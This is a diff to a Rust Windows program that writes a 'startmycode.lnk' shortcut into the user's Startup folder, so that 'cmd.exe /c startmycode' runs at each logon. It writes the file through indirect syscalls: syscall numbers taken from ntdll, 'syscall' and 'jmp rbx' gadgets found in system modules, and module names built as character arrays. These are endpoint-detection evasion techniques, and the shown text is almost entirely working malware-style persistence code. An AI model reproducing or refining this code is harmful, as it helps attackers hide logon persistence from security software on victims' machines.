@@ -12,14 +12,13 @@ use std::ffi::c_void;
 use windows_sys::Win32::Foundation::{HANDLE, NTSTATUS, UNICODE_STRING, GENERIC_WRITE, S_OK};
 use windows_sys::Win32::Storage::FileSystem::{FILE_ATTRIBUTE_NORMAL};
 use windows_sys::Win32::System::Com::{
-    CoInitializeEx, CoCreateInstance, CLSCTX_ALL, COINIT_MULTITHREADED,
+    CoInitialize, CoCreateInstance, CLSCTX_ALL,
     IStream, CoTaskMemFree,
 };
 use windows_sys::Win32::System::Memory::{GlobalLock, GlobalUnlock};
-use windows_sys::Win32::UI::Shell::{SHGetKnownFolderPath, KF_FLAG_DEFAULT};
+use windows_sys::Win32::UI::Shell::{SHGetKnownFolderPath, KF_FLAG_CREATE};
 use windows_sys::core::GUID;
 
-// Define missing constants and functions
 const FOLDERID_Startup: GUID = GUID {
     data1: 0xB97D20BB,
     data2: 0xF46A,
@@ -55,7 +54,6 @@ extern "system" {
     fn GetHGlobalFromStream(pstm: *mut IStream, phglobal: *mut *mut c_void) -> i32;
 }
 
-// Define VTables manually for windows-sys
 #[repr(C)]
 struct IUnknownVtbl {
     QueryInterface: unsafe extern "system" fn(*mut c_void, *const GUID, *mut *mut c_void) -> i32,
@@ -72,9 +70,9 @@ struct IShellLinkWVtbl {
     GetIDList: usize,
     SetIDList: usize,
     GetDescription: usize,
-    SetDescription: usize,
+    SetDescription: unsafe extern "system" fn(*mut c_void, *const u16) -> i32,
     GetWorkingDirectory: usize,
-    SetWorkingDirectory: usize,
+    SetWorkingDirectory: unsafe extern "system" fn(*mut c_void, *const u16) -> i32,
     GetArguments: usize,
     SetArguments: unsafe extern "system" fn(*mut c_void, *const u16) -> i32,
     GetHotkey: usize,
@@ -176,6 +174,7 @@ fn main() {
         let ntdll_name = ['n' as u16, 't' as u16, 'd' as u16, 'l' as u16, 'l' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16];
         let k32_name = ['k' as u16, 'e' as u16, 'r' as u16, 'n' as u16, 'e' as u16, 'l' as u16, '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16];
         let kbase_name = ['k' as u16, 'e' as u16, 'r' as u16, 'n' as u16, 'e' as u16, 'l' as u16, 'b' as u16, 'a' as u16, 's' as u16, 'e' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16];
+        let w32u_name = ['w' as u16, 'i' as u16, 'n' as u16, '3' as u16, '2' as u16, 'u' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16];
 
         let ntdll_base = syscalls::get_module_base(&ntdll_name);
         if ntdll_base.is_null() { return; }
@@ -184,7 +183,7 @@ fn main() {
         let nt_write_file_ssn = syscalls::get_ssn(ntdll_base as *const u8, "NtWriteFile").expect("Failed to get NtWriteFile SSN");
         let nt_close_ssn = syscalls::get_ssn(ntdll_base as *const u8, "NtClose").expect("Failed to get NtClose SSN");
 
-        let modules: [&[u16]; 3] = [&ntdll_name, &k32_name, &kbase_name];
+        let modules: [&[u16]; 4] = [&ntdll_name, &k32_name, &kbase_name, &w32u_name];
 
         let mut syscall_gadget = null_mut();
         for mod_name in &modules {
@@ -210,35 +209,42 @@ fn main() {
         }
         if jmp_rbx_gadget.is_null() { return; }
 
-        // 1. Resolve Startup folder path using SHGetKnownFolderPath
         let mut path_ptr: *mut u16 = null_mut();
-        if SHGetKnownFolderPath(&FOLDERID_Startup, KF_FLAG_DEFAULT as u32, 0, &mut path_ptr) != S_OK {
+        if SHGetKnownFolderPath(&FOLDERID_Startup, KF_FLAG_CREATE as u32, 0, &mut path_ptr) != S_OK {
             return;
         }
 
-        // Convert path to NT format
         let mut i = 0;
         while *path_ptr.add(i) != 0 { i += 1; }
         let path_slice = std::slice::from_raw_parts(path_ptr, i);
-        let path_str = String::from_utf16_lossy(path_slice);
-        let full_path = format!("{}\\{}", path_str.trim_end_matches('\\'), "startmycode.lnk");
-        let nt_startup_path = to_nt_path(&full_path.encode_utf16().chain(std::iter::once(0)).collect::<Vec<u16>>());
+
+        let mut full_path_wide = path_slice.to_vec();
+        if !full_path_wide.is_empty() && full_path_wide[full_path_wide.len()-1] != '\\' as u16 {
+            full_path_wide.push('\\' as u16);
+        }
+        full_path_wide.extend("startmycode.lnk".encode_utf16());
+        full_path_wide.push(0);
+
+        let nt_startup_path = to_nt_path(&full_path_wide);
         let unicode_startup = create_unicode_string(&nt_startup_path);
 
         CoTaskMemFree(path_ptr as *const _);
 
-        // 2. Generate LNK content using COM
-        CoInitializeEx(null_mut(), COINIT_MULTITHREADED as u32);
+        CoInitialize(null_mut());
 
         let mut shell_link_ptr: *mut c_void = null_mut();
         if CoCreateInstance(&CLSID_ShellLink, null_mut(), CLSCTX_ALL, &IID_IShellLinkW, &mut shell_link_ptr) == S_OK {
             let shell_link_vtbl = *(shell_link_ptr as *mut *mut IShellLinkWVtbl);
 
             let target_path = "C:\\Windows\\System32\\cmd.exe".encode_utf16().chain(std::iter::once(0)).collect::<Vec<u16>>();
-            ((*shell_link_vtbl).SetPath)(shell_link_ptr, target_path.as_ptr());
-
             let args = "/c startmycode".encode_utf16().chain(std::iter::once(0)).collect::<Vec<u16>>();
+            let desc = "Start My Code".encode_utf16().chain(std::iter::once(0)).collect::<Vec<u16>>();
+            let work_dir = "C:\\Windows\\System32".encode_utf16().chain(std::iter::once(0)).collect::<Vec<u16>>();
+
+            ((*shell_link_vtbl).SetPath)(shell_link_ptr, target_path.as_ptr());
             ((*shell_link_vtbl).SetArguments)(shell_link_ptr, args.as_ptr());
+            ((*shell_link_vtbl).SetDescription)(shell_link_ptr, desc.as_ptr());
+            ((*shell_link_vtbl).SetWorkingDirectory)(shell_link_ptr, work_dir.as_ptr());
 
             let mut persist_stream_ptr: *mut c_void = null_mut();
             if ((*shell_link_vtbl).QueryInterface)(shell_link_ptr, &IID_IPersistStream, &mut persist_stream_ptr) == S_OK {
@@ -283,6 +289,7 @@ fn main() {
 
                                 if status == 0 {
                                     let mut write_io_status = IO_STATUS_BLOCK { Status: 0, Information: 0 };
+                                    let mut byte_offset: i64 = 0;
                                     crate::syscall!(
                                         nt_write_file_ssn,
                                         syscall_gadget as *const u8,
@@ -294,7 +301,7 @@ fn main() {
                                         &mut write_io_status as *mut _ as usize,
                                         data_ptr as usize,
                                         stat.cbSize as usize,
-                                        0,
+                                        &mut byte_offset as *mut _ as usize,
                                         0
                                     );
                                     crate::syscall!(nt_close_ssn, syscall_gadget as *const u8, jmp_rbx_gadget as *const u8, out_handle as usize);
